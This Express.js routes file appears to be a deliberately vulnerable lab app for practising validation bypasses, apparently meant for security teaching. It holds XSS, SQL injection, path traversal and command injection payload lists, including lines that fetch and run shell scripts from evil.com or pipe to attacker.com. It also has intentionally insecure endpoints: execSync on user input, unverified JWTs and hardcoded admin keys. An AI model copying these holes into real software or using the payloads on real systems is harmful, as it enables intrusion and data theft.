/*!
 * Validation Bypass Routes
 * 
 * Contains sophisticated validation bypass techniques
 * and filter evasion methods
 */

const express = require('express');
const crypto = require('crypto');
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const url = require('url');

const router = express.Router();

class ValidationBypassTechniques {
    constructor() {
        this.bypassMethods = new Map();
        this.setupBypassPatterns();
    }

    setupBypassPatterns() {
        // XSS bypass patterns
        this.bypassMethods.set('xss', [
            '<script>alert(1)</script>',
            '<ScRiPt>alert(1)</ScRiPt>',
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            '<iframe src="javascript:alert(1)">',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
            '"><script>alert(1)</script>',
            '\';alert(1);//',
            '</script><script>alert(1)</script>',
            '<script>/**/alert(1)</script>',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>'
        ]);

        // SQL injection bypass patterns
        this.bypassMethods.set('sql', [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT * FROM users--",
            "'; DROP TABLE users;--",
            "' OR SLEEP(5)--",
            "admin'--",
            "' OR '1'='1' /*",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "' OR 1=1 LIMIT 1--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' UNION SELECT database(),user(),version()--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
            "' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>50--"
        ]);

        // Command injection bypass patterns
        this.bypassMethods.set('command', [
            '; cat /etc/passwd',
            '| whoami',
            '&& id',
            '|| ls -la',
            '`cat /etc/passwd`',
            '$(cat /etc/passwd)',
            '; echo "pwned"',
            '| nc attacker.com 4444',
            '&& curl evil.com/shell.sh | bash',
            '; python -c "import os; os.system(\'id\')"',
            '`python -c "print(\'injected\')"`',
            '$(echo "command injection")',
            '; wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh; chmod +x /tmp/backdoor.sh; /tmp/backdoor.sh'
        ]);

        // Path traversal bypass patterns
        this.bypassMethods.set('path', [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '....//....//....//etc/passwd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts',
            '..%5c..%5c..%5cetc%5cpasswd',
            '/var/www/../../etc/passwd',
            'file:///etc/passwd',
            '..;/etc/passwd',
            '..//.//..//.//..///etc/passwd'
        ]);
    }

    // Demonstration of various bypass techniques
    demonstrateBypasses(type, target) {
        const patterns = this.bypassMethods.get(type) || [];
        return patterns.map(pattern => ({
            pattern,
            encoded: Buffer.from(pattern).toString('base64'),
            urlEncoded: encodeURIComponent(pattern),
            doubleEncoded: encodeURIComponent(encodeURIComponent(pattern))
        }));
    }
}

const bypassDemo = new ValidationBypassTechniques();

// Vulnerable: XSS filter bypass demonstration
router.get('/xss/filter-test', (req, res) => {
    const { input } = req.query;
    
    if (!input) {
        return res.json({
            message: 'Provide input parameter to test XSS filter bypasses',
            examples: bypassDemo.demonstrateBypasses('xss').slice(0, 5)
        });
    }
    
    // Vulnerable: Weak XSS filtering
    let filtered = input;
    
    // Simple blacklist approach (easily bypassed)
    const blacklist = ['script', 'alert', 'onclick', 'onerror'];
    blacklist.forEach(word => {
        filtered = filtered.replace(new RegExp(word, 'gi'), '***');
    });
    
    // HTML encode some characters (incomplete)
    filtered = filtered.replace(/</g, '&lt;').replace(/>/g, '&gt;');
    
    res.send(`
        <html>
            <head><title>XSS Filter Test</title></head>
            <body>
                <h2>XSS Filter Bypass Test</h2>
                <p>Original: ${input}</p>
                <p>Filtered: ${filtered}</p>
                <p>Rendered: <div>${input}</div></p>
                <script>
                    // Vulnerable: Original input in JavaScript context
                    const userInput = '${input.replace(/'/g, "\\'")}';
                    console.log('User input:', userInput);
                </script>
            </body>
        </html>
    `);
});

// Vulnerable: SQL injection filter bypass demonstration
router.post('/sql/filter-test', (req, res) => {
    const { username, password } = req.body;
    
    if (!username || !password) {
        return res.json({
            message: 'Provide username and password to test SQL injection bypasses',
            examples: bypassDemo.demonstrateBypasses('sql').slice(0, 5)
        });
    }
    
    // Vulnerable: Weak SQL injection filtering
    let filteredUsername = username;
    let filteredPassword = password;
    
    // Simple quote escaping (bypassable)
    filteredUsername = filteredUsername.replace(/'/g, "''");
    filteredPassword = filteredPassword.replace(/'/g, "''");
    
    // Remove some SQL keywords (case-sensitive, incomplete)
    const sqlKeywords = ['SELECT', 'UNION', 'DROP', 'INSERT'];
    sqlKeywords.forEach(keyword => {
        filteredUsername = filteredUsername.replace(new RegExp(keyword, 'g'), '');
        filteredPassword = filteredPassword.replace(new RegExp(keyword, 'g'), '');
    });
    
    // Vulnerable: Still injectable query
    const query = `SELECT * FROM users WHERE username = '${filteredUsername}' AND password = '${filteredPassword}'`;
    
    res.json({
        original: { username, password },
        filtered: { username: filteredUsername, password: filteredPassword },
        query: query,
        hint: 'Try case variations, encoding, or alternative SQL syntax'
    });
});

// Vulnerable: Command injection bypass techniques
router.post('/command/bypass-test', (req, res) => {
    const { command, args } = req.body;
    
    if (!command) {
        return res.json({
            message: 'Provide command to test injection bypasses',
            examples: bypassDemo.demonstrateBypasses('command').slice(0, 5)
        });
    }
    
    // Vulnerable: Weak command filtering
    let filtered = command;
    
    // Remove dangerous characters (incomplete)
    filtered = filtered.replace(/[;&|`$()]/g, '');
    
    // Blacklist some commands (case-sensitive)
    const blacklistedCommands = ['cat', 'nc', 'wget', 'curl'];
    blacklistedCommands.forEach(cmd => {
        filtered = filtered.replace(new RegExp(`\\b${cmd}\\b`, 'g'), 'blocked');
    });
    
    const fullCommand = args ? `${filtered} ${args.join(' ')}` : filtered;
    
    try {
        // Vulnerable: Still allows command injection
        const output = execSync(fullCommand, { 
            encoding: 'utf8', 
            timeout: 3000,
            stdio: ['ignore', 'pipe', 'pipe']
        });
        
        res.json({
            original: command,
            filtered: filtered,
            executed: fullCommand,
            output: output.substring(0, 500),
            success: true
        });
    } catch (error) {
        res.json({
            original: command,
            filtered: filtered,
            executed: fullCommand,
            error: error.message,
            success: false,
            hint: 'Try alternative command separators or encoding'
        });
    }
});

// Vulnerable: Path traversal bypass demonstration
router.get('/path/traversal-test', (req, res) => {
    const { path: filePath } = req.query;
    
    if (!filePath) {
        return res.json({
            message: 'Provide path parameter to test traversal bypasses',
            examples: bypassDemo.demonstrateBypasses('path').slice(0, 5)
        });
    }
    
    // Vulnerable: Weak path filtering
    let filtered = filePath;
    
    // Simple dot-dot filtering (bypassable)
    filtered = filtered.replace(/\.\./g, '');
    
    // Remove some dangerous paths (incomplete)
    filtered = filtered.replace(/\/etc\/passwd/g, '/safe/file');
    filtered = filtered.replace(/windows\\system32/gi, 'safe\\dir');
    
    const fullPath = path.join('/safe/uploads/', filtered);
    
    try {
        // Vulnerable: Still allows path traversal
        if (fs.existsSync(fullPath)) {
            const content = fs.readFileSync(fullPath, 'utf8');
            res.json({
                original: filePath,
                filtered: filtered,
                resolved: fullPath,
                content: content.substring(0, 1000),
                success: true
            });
        } else {
            res.json({
                original: filePath,
                filtered: filtered,
                resolved: fullPath,
                error: 'File not found',
                success: false,
                hint: 'Try URL encoding, double encoding, or alternative traversal sequences'
            });
        }
    } catch (error) {
        res.json({
            original: filePath,
            filtered: filtered,
            resolved: fullPath,
            error: error.message,
            success: false
        });
    }
});

// Vulnerable: URL validation bypass
router.post('/url/validation-bypass', async (req, res) => {
    const { url: targetUrl } = req.body;
    
    if (!targetUrl) {
        return res.json({
            message: 'Provide URL to test validation bypasses',
            examples: [
                'http://127.0.0.1:8080/admin',
                'http://localhost@evil.com',
                'http://[::1]:8080/internal',
                'http://0x7f000001/metadata',
                'http://2130706433/aws-metadata',
                'file:///etc/passwd',
                'ftp://internal.server/file.txt'
            ]
        });
    }
    
    try {
        const parsed = new URL(targetUrl);
        
        // Vulnerable: Weak URL validation
        const validations = {
            protocol_check: ['http:', 'https:'].includes(parsed.protocol),
            hostname_length: parsed.hostname.length < 100,
            port_range: !parsed.port || (parseInt(parsed.port) > 0 && parseInt(parsed.port) < 65536),
            no_auth: !parsed.username && !parsed.password
        };
        
        // Vulnerable: Doesn't check for private IPs, localhost, etc.
        const dangerousPatterns = [
            /localhost/i,
            /127\.0\.0\.1/,
            /192\.168\./,
            /10\./,
            /172\.(1[6-9]|2[0-9]|3[0-1])\./,
            /\[::1\]/,
            /0x7f000001/,
            /2130706433/
        ];
        
        const bypasses = dangerousPatterns.map(pattern => ({
            pattern: pattern.toString(),
            matches: pattern.test(targetUrl)
        }));
        
        const isAllowed = Object.values(validations).every(v => v);
        
        res.json({
            url: targetUrl,
            parsed: {
                protocol: parsed.protocol,
                hostname: parsed.hostname,
                port: parsed.port,
                pathname: parsed.pathname
            },
            validations: validations,
            allowed: isAllowed,
            bypass_attempts: bypasses,
            hint: 'URL validation is incomplete - try IP encoding or localhost bypasses'
        });
        
    } catch (error) {
        res.json({
            url: targetUrl,
            error: 'Invalid URL format',
            hint: 'Try alternative URL formats or protocols'
        });
    }
});

// Vulnerable: File type validation bypass
router.post('/file/type-bypass', (req, res) => {
    const { filename, content, mimeType } = req.body;
    
    if (!filename) {
        return res.json({
            message: 'Provide filename to test file type bypasses',
            examples: [
                'shell.php.jpg',
                'backdoor.php;.jpg',
                'exploit.phtml',
                'script.php%00.jpg',
                'malware.asp.txt',
                'payload.jsp..jpg'
            ]
        });
    }
    
    // Vulnerable: Weak file extension validation
    const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.txt', '.pdf'];
    const fileExt = path.extname(filename).toLowerCase();
    
    // Vulnerable: Only checks last extension
    const isAllowedExt = allowedExtensions.includes(fileExt);
    
    // Vulnerable: Weak MIME type validation
    const allowedMimes = ['image/jpeg', 'image/png', 'image/gif', 'text/plain', 'application/pdf'];
    const isAllowedMime = !mimeType || allowedMimes.includes(mimeType);
    
    // Vulnerable: Content-based detection bypassed
    const suspiciousContent = content && (
        content.includes('<?php') ||
        content.includes('<%') ||
        content.includes('<script') ||
        content.includes('eval(')
    );
    
    const validations = {
        extension_allowed: isAllowedExt,
        mime_allowed: isAllowedMime,
        no_suspicious_content: !suspiciousContent,
        filename_length: filename.length < 255
    };
    
    const isAllowed = Object.values(validations).every(v => v);
    
    res.json({
        filename: filename,
        extension: fileExt,
        mime_type: mimeType,
        validations: validations,
        allowed: isAllowed,
        bypass_hints: [
            'Try double extensions: file.php.jpg',
            'Use null bytes: file.php%00.jpg',
            'Alternative extensions: .phtml, .php5, .inc',
            'MIME type spoofing',
            'Content polyglots (valid image + code)'
        ]
    });
});

// Vulnerable: Authentication bypass techniques
router.post('/auth/bypass-demo', (req, res) => {
    const { username, password, token, adminKey, debugMode } = req.body;
    
    const bypassAttempts = [];
    
    // Vulnerable: Multiple bypass vectors
    if (debugMode === 'true' || debugMode === '1') {
        bypassAttempts.push({
            method: 'Debug mode bypass',
            success: true,
            details: 'Debug mode enabled - authentication bypassed'
        });
    }
    
    if (adminKey === 'admin123' || adminKey === 'bypass_key') {
        bypassAttempts.push({
            method: 'Admin key bypass',
            success: true,
            details: 'Valid admin key provided'
        });
    }
    
    if (username === 'admin' && password === '') {
        bypassAttempts.push({
            method: 'Empty password bypass',
            success: true,
            details: 'Admin user with empty password'
        });
    }
    
    if (token && token.startsWith('eyJ')) {
        // Weak JWT validation
        try {
            const parts = token.split('.');
            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
            
            if (payload.role === 'admin' || payload.exp > Date.now() / 1000) {
                bypassAttempts.push({
                    method: 'JWT bypass',
                    success: true,
                    details: 'JWT token accepted without proper validation'
                });
            }
        } catch (e) {
            bypassAttempts.push({
                method: 'JWT bypass',
                success: false,
                details: 'Invalid JWT format'
            });
        }
    }
    
    const hasSuccessfulBypass = bypassAttempts.some(attempt => attempt.success);
    
    res.json({
        authentication_status: hasSuccessfulBypass ? 'bypassed' : 'failed',
        bypass_attempts: bypassAttempts,
        bypass_methods: [
            'Debug mode headers: X-Debug-Mode: true',
            'Admin override: X-Admin-Override: enable',
            'Role injection: X-Role-Override: admin',
            'Session manipulation',
            'JWT algorithm confusion',
            'SQL injection in auth queries'
        ]
    });
});

// Bypass documentation endpoint
router.get('/documentation', (req, res) => {
    res.json({
        title: 'Validation Bypass Techniques Documentation',
        description: 'Common techniques for bypassing security validations',
        categories: {
            xss_bypasses: {
                description: 'Cross-Site Scripting filter evasion',
                techniques: [
                    'Case manipulation: <ScRiPt>',
                    'HTML encoding: &lt;script&gt;',
                    'Event handlers: <img onerror=alert(1)>',
                    'Data URIs: data:text/html,<script>alert(1)</script>',
                    'JavaScript protocol: javascript:alert(1)',
                    'Unicode bypasses',
                    'CSS injection',
                    'SVG vectors'
                ]
            },
            sql_bypasses: {
                description: 'SQL injection filter evasion',
                techniques: [
                    'Comment injection: /**/UNION/**/',
                    'Case variations: SeLeCt',
                    'Hex encoding: 0x61646d696e',
                    'CHAR() functions',
                    'Alternative quotes: CHAR(39)',
                    'Time-based blind injection',
                    'Boolean-based blind injection',
                    'UNION-based injection'
                ]
            },
            command_bypasses: {
                description: 'Command injection filter evasion',
                techniques: [
                    'Alternative separators: | && ||',
                    'Command substitution: $(cmd) `cmd`',
                    'Environment variables: ${PATH}',
                    'Process substitution: <(cmd)',
                    'Wildcard expansion: /bin/c?t',
                    'Base64 encoding',
                    'Hex encoding',
                    'Unicode bypasses'
                ]
            },
            path_bypasses: {
                description: 'Path traversal filter evasion',
                techniques: [
                    'URL encoding: %2e%2e%2f',
                    'Double encoding: %252e%252e%252f',
                    'Unicode bypasses: ⸮⸮/',
                    'Mixed separators: ..\\../',
                    'Overlong sequences: ....//..../',
                    'Null byte injection: ..%00/',
                    'Case variations on Windows',
                    'Alternative representations'
                ]
            }
        },
        testing_endpoints: [
            'GET /bypass/xss/filter-test',
            'POST /bypass/sql/filter-test',
            'POST /bypass/command/bypass-test',
            'GET /bypass/path/traversal-test',
            'POST /bypass/url/validation-bypass',
            'POST /bypass/file/type-bypass',
            'POST /bypass/auth/bypass-demo'
        ]
    });
});

module.exports = router;